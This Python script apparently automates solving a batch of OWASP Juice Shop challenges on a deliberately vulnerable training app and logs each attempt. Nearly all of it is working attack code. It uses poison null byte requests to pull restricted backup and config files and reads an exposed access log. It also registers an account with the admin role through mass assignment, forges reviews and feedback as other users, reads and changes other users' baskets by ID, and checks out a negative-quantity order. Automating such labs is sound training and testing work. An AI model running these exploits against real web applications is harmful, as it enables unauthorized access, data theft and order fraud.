"""Batch 2: pixel-detected frontend challenges, poison null byte file disclosure,
access log, and auth-based access control."""
import harness, urllib.parse, re
from harness import Session, log_attempt, solved_set
s = Session()
DOMAIN="juice-sh.op"
def solved(k): return k in solved_set(s)
def L(key,name,approach,detail=""):
    ok = solved(key); return log_attempt(key,name,approach,("success" if ok else "failed"),ok,detail)

PAD="/assets/public/images/padding/"
# --- pixel-detected "frontend" challenges (server-side breadcrumb) ---
pixels = {
 "scoreBoardChallenge":("Score Board","1px.png"),
 "web3SandboxChallenge":("Web3 Sandbox","11px.png"),
 "adminSectionChallenge":("Admin Section","19px.png"),
 "tokenSaleChallenge":("Blockchain Hype","56px.png"),
 "privacyPolicyChallenge":("Privacy Policy","81px.png"),
}
for key,(name,px) in pixels.items():
    s.get(PAD+px, auth=False)
    L(key,name,f"GET {PAD}{px} (page breadcrumb pixel triggers server-side solve)")

# Extra Language (Klingon)
s.get("/assets/i18n/tlh_AA.json", auth=False)
L("extraLanguageChallenge","Extra Language","GET /assets/i18n/tlh_AA.json (hidden Klingon locale)")

# Missing Encoding (cat photo, exact url-encoded name)
cat = "/assets/public/images/uploads/%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
s.get(cat, auth=False)
L("missingEncodingChallenge","Missing Encoding","GET cat photo via correctly URL-encoded path with # chars")

# --- poison null byte file disclosure ---
nb = {
 "easterEggLevelOneChallenge":("Easter Egg","eastere.gg"),
 "forgottenDevBackupChallenge":("Forgotten Developer Backup","package.json.bak"),
 "forgottenBackupChallenge":("Forgotten Sales Backup","coupons_2013.md.bak"),
 "misplacedSignatureFileChallenge":("Misplaced Signature File","suspicious_errors.yml"),
}
for key,(name,fn) in nb.items():
    r = s.get(f"/ftp/{fn}%2500.md", auth=False)
    L(key,name,f"GET /ftp/{fn}%2500.md (poison null byte bypasses .md/.pdf allowlist)", f"{r.status_code}")
# nullByte (encrypt.pyc) — also satisfied by any of the above
r = s.get("/ftp/encrypt.pyc%2500.md", auth=False)
L("nullByteChallenge","Poison Null Byte","GET /ftp/encrypt.pyc%2500.md (poison null byte)", f"{r.status_code}")

# --- access log disclosure ---
listing = s.get("/support/logs/", auth=False).text
logfile = None
m = re.findall(r'href="([^"]*access\.log[^"]*)"', listing)
if m: logfile = m[0].split("/")[-1]
logfile = logfile or "access.log"
r = s.get("/support/logs/"+logfile, auth=False)
L("accessLogDisclosureChallenge","Access Log",
  f"Browse /support/logs/ then GET /support/logs/{logfile}", f"{r.status_code} list_hits={len(m)}")

# ---- authenticated attacks ----
ATTEMAIL="attacker_ctf@evil.io"; ATTPW="Attacker1!"
s.register(ATTEMAIL, ATTPW)
r = s.post("/rest/user/login", auth=False, json={"email":ATTEMAIL,"password":ATTPW})
tok = r.json()["authentication"]["token"]; s.token=tok
me = harness.jwt_decode(tok)["data"]
mybid = me.get("bid"); myid = me.get("id")
print(f"  (logged in id={myid} bid={mybid})")

# Forged Review — author != me
r = s.post(f"/rest/products/1/reviews", json={"message":"forged!","author":f"admin@{DOMAIN}"})
L("forgedReviewChallenge","Forged Review","POST /rest/products/1/reviews with author=admin@juice-sh.op (not own email)", f"{r.status_code}")

# Register Admin
r = s.post("/api/Users", auth=False, json={"email":"adminreg@evil.io","password":"Pwn12345!","passwordRepeat":"Pwn12345!","role":"admin","securityQuestion":{"id":2},"securityAnswer":"x"})
L("registerAdminChallenge","Admin Registration","POST /api/Users with role:'admin' (mass-assignment)", f"{r.status_code}")

# Forged Feedback — UserId != mine, with captcha
c = s.get("/rest/captcha/", auth=False).json()
r = s.post("/api/Feedbacks", json={"comment":"forged fb","rating":3,"UserId":1,"captchaId":c["captchaId"],"captcha":c["answer"]})
L("forgedFeedbackChallenge","Forged Feedback","POST feedback with UserId=1 while logged in as another user", f"{r.status_code}")

# Basket Access — view another basket id
other = 1 if mybid != 1 else 2
r = s.get(f"/rest/basket/{other}")
L("basketAccessChallenge","View Basket",f"GET /rest/basket/{other} (IDOR, my bid={mybid})", f"{r.status_code}")

# Basket Manipulate — add item to a basket that isn't mine
othbid = 1 if mybid != 1 else 2
r = s.post("/api/BasketItems", json={"ProductId":1,"BasketId":othbid,"quantity":1})
L("basketManipulateChallenge","Manipulate Basket",f"POST /api/BasketItems BasketId={othbid} (not my bid {mybid})", f"{r.status_code} {r.text[:60]}")

# Negative Order — negative quantity then checkout
# add item to my own basket with negative quantity
s.post("/api/BasketItems", json={"ProductId":1,"BasketId":mybid,"quantity":-50})
r = s.post(f"/rest/basket/{mybid}/checkout")
L("negativeOrderChallenge","Payback Time",f"Add negative-quantity item to basket {mybid}, checkout -> negative total", f"{r.status_code} {r.text[:80]}")

print("done batch2")
